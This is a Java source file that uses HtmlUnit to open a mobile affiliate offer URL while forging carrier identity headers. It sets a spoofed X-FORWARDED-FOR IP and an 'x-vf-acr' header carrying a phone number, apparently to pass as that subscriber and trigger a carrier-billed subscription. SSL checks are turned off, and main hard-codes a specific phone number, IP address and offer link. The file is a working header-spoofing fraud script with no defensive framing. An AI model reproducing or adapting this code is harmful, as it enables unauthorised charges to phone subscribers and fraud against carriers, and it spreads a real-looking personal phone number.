package com.solution.honduras;

import com.gargoylesoftware.htmlunit.BrowserVersion;
import com.gargoylesoftware.htmlunit.HttpMethod;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.WebRequest;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import java.io.BufferedReader;
import java.io.IOException;
import java.net.URL;

public class HnWinCardSolution {
  public static int k = 0;
  
  public String getProcessSolution(String msisdn, String ip, String cmpUrl) {
    WebClient webClient = null;
    try {
      webClient = new WebClient(BrowserVersion.BEST_SUPPORTED);
      webClient.getOptions().setUseInsecureSSL(true);
      webClient.getOptions().setThrowExceptionOnFailingStatusCode(false);
      webClient.getOptions().setJavaScriptEnabled(true);
      webClient.getOptions().setRedirectEnabled(true);
      webClient.getOptions().setCssEnabled(true);
      webClient.getOptions().setThrowExceptionOnScriptError(false);
      webClient.getOptions().setTimeout(20000);
      webClient.setJavaScriptTimeout(8000L);
      webClient.addRequestHeader("X-FORWARDED-FOR", ip);
      webClient.addRequestHeader("x-vf-acr", msisdn);
      webClient.addRequestHeader("User-Agent", 
          "Mozilla/5.0 (Linux; Android 7.0; PLUS Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36");
      webClient.waitForBackgroundJavaScript(10000L);
      webClient.addRequestHeader("Access-Control-Allow-Credentials", "true");
      webClient.addRequestHeader("Access-Control-Allow-Headers", 
          "Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");
      webClient.addRequestHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS, DELETE, PUT");
      webClient.addRequestHeader("Access-Control-Max-Age", "3600");
      webClient.addRequestHeader("Cache-Control", "no-cache, must-revalidate, private");
      webClient.addRequestHeader("X-FRAME-OPTIONS", "SAMEORIGIN");
      webClient.getOptions().setUseInsecureSSL(true);
      URL url2 = new URL(cmpUrl);
      WebRequest requestSettings2 = new WebRequest(url2, HttpMethod.GET);
      requestSettings2.setAdditionalHeader("X-FORWARDED-FOR", ip);
      requestSettings2.setAdditionalHeader("x-vf-acr", msisdn);
      System.out.println("Request Params -->\n" + requestSettings2.getRequestParameters() + "-->\nURL-->" + 
          requestSettings2.getUrl());
      HtmlPage page22 = (HtmlPage)webClient.getPage(requestSettings2);
      synchronized (page22) {
        webClient.waitForBackgroundJavaScript(3000L);
      } 
      System.out.println("page-->\n" + page22.getBaseURI());
      System.out.println("Full Page Info-->" + page22.asXml());
      URL url3 = new URL(String.valueOf(page22.getBaseURI()) + msisdn);
      WebRequest webRequest3 = new WebRequest(url3, HttpMethod.GET);
      WebRequest requestSettings3 = new WebRequest(url2, HttpMethod.GET);
      requestSettings3.setAdditionalHeader("X-FORWARDED-FOR", ip);
      requestSettings3.setAdditionalHeader("x-vf-acr", msisdn);
      HtmlPage page3 = (HtmlPage)webClient.getPage(requestSettings3);
      System.out.println("------------ DONE --------------");
    } catch (Exception e) {
      e.printStackTrace();
      System.out.println("Exception occured on MSISDN-->" + msisdn + "--> Error Msg-->" + e.getMessage());
    } finally {
      webClient.close();
    } 
    return null;
  }
  
  public static void main(String[] args) {
    String tempmssidn = "";
    BufferedReader in = null;
    try {
      HnWinCardSolution saSolution = new HnWinCardSolution();
      saSolution.getProcessSolution("50498782429", "186.2.136.21", "http://maclato.offerstrack.net/index.php?offer_id=1547&aff_id=221");
    } catch (Exception e) {
      System.out.println("Error with msisdn or request already processed-->" + tempmssidn);
    } finally {
      if (in != null)
        try {
          in.close();
        } catch (IOException e) {
          System.out.println(e.getMessage());
        }  
    } 
  }
}
